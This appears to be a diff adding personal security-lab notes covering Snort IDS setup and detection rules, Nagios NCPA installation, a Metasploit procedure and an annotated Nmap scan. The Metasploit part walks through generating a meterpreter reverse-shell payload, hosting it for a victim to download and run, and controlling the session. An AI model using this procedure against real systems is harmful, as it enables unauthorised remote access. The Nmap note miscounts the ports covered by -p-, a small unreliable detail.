@@ -1,0 +1,135 @@
+Snort :-
+
+sudo systemctl status snort
+   80  sudo apt-get install snort -y
+   81  cd /etc/snort
+   82  sudo vim snort.
+   83  sudo vim snort.conf 
+   84  sudo systemctl restart snort
+   85  cd rules/
+   86  sudo vim local.rules 
+
+
+for Comment all rules of snort :-
+sudo sed -i 's/^include \$RULE_PATH/#include \$RULE_PATH/' snort.conf 
+
+Live logs in console 
+sudo snort -A console -q -c snort.conf 
+
+Test
+sudo snort -T -i ens37 -c snort.conf 
+
+Rules 
+
+alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; sid:1000001; rev:1;)   
+alert tcp any any -> $HOME_NET 80 (msg:"Suspicious User-Agent"; content:"evilbot"; http_header; sid:1000002; rev:1;)
+alert ip any any -> any any (msg:"Potential MAC Flooding - High Packet Rate"; detection_filter: track by_src, count 1000, seconds 10; sid:1000010; rev:1;)
+alert tcp any any -> $HOME_NET any (msg:"SYN Flood Attack Detected (Single Source)"; flags:S; detection_filter:track by_src, count 10, seconds 5; sid:1000020; rev:1;)  
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Nagios NCPA Client :-
+
+Installation of Nagios Repo
+Execute the following commands:
+
+apt-get install apt-transport-https
+sudo mkdir -m 0755 -p /etc/apt/keyrings/
+
+curl -fsSL https://repo.nagios.com/GPG-KEY-NAGIOS-V3 | sudo gpg --dearmor -o /etc/apt/keyrings/GPG-KEY-NAGIOS-V3.gpg
+
+echo "Types: deb
+URIs: https://repo.nagios.com/deb/$(lsb_release -cs)
+Suites: /
+Signed-By: /etc/apt/keyrings/GPG-KEY-NAGIOS-V3.gpg" | sudo tee /etc/apt/sources.list.d/nagios.sources > /dev/null
+
+sudo apt-get update
+If you are using an older OS or would like to use the legacy (less secure) method follow these steps:
+
+apt-get install apt-transport-https
+echo "deb https://repo.nagios.com/deb/$(lsb_release -cs) /" > /etc/apt/sources.list.d/nagios.list
+
+wget -qO - https://repo.nagios.com/GPG-KEY-NAGIOS-V3 | apt-key add -
+
+apt-get update
+Installation and Upgrade of NCPA
+apt-get install ncpa
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Metasploit :-
+
+msfdb reinit
+msfconsole
+use payload/linux/x64/meterpreter/reverse_tcp   |  use payload/windows/x64/meterpreter/reverse_tcp
+set LHOST 
+set LPORT
+generate -f elf -o ~/home/payload/abc.elf       |  generate -f exe/raw -o ~/home/payload/abc.exe/raw
+back 
+
+Activate Listener :-
+
+use multi/handler
+set LHOST 
+set LPORT
+set PAYLOAD linux/x64/meterpreter/reverse_tcp   |  set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit
+
+Webhost Payload from the Directory :-
+cd ~/home/payload/
+python3 -m http.server --bind <ip-kali> <port_any_but_not_LPORT>
+
+CLient :- 
+Access Website DOwnload Payload 
+http://<ip-kali>:<port_any_but_not_LPORT>
+chmod +x abc.elf
+./abc.elf
+
+After This go to Kali :-
+meterpreter > shell 
+              script /dev/null -qc bash
+
+Meterpreter Command :
+
+help 'OR' ?: Display the help menu
+migrate <PID> 
+ps
+upload <local> <remote>
+download <remote> <local>
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+NMAP :-
+
+
+The -A (Aggressive Scan) option is a shortcut that automatically enables:
+-A 
+├── -O                
+├── -sV               
+├── -sC               
+└── --traceroute      
+→ OS Detection 
+→ Version Detection 
+→ Default NSE Scripts 
+→ Traceroute
+
+
+
+sudo nmap \ -sS \ -sV \ -sC \ -O \ -A \ -p- \ --version-all \ --reason \ --traceroute \ --script "default,vuln,safe" \ -T4 \ -oA full_report \ 
+192.168.74.130
+
+
+sudo  Runs Nmap with root privileges.
+-sS – Performs a TCP SYN stealth scan.
+-sV – Detects service and software versions.
+-sC – Runs default scripts.
+-O – Detects target Operating System.
+-A – Enables OS, version, script, and traceroute detection.
+-p- – Scans all 65,335 ports.
+--version-all – Tries every available version probe.
+--reason – Shows why a port is open or closed.
+--traceroute – Maps network hops to the target.
+--script "default,vuln,safe" – Runs default, vulnerability, and safe scripts.
+-T4 – Sets aggressive speed timing.
+-oA full_report – Saves output in three file formats.
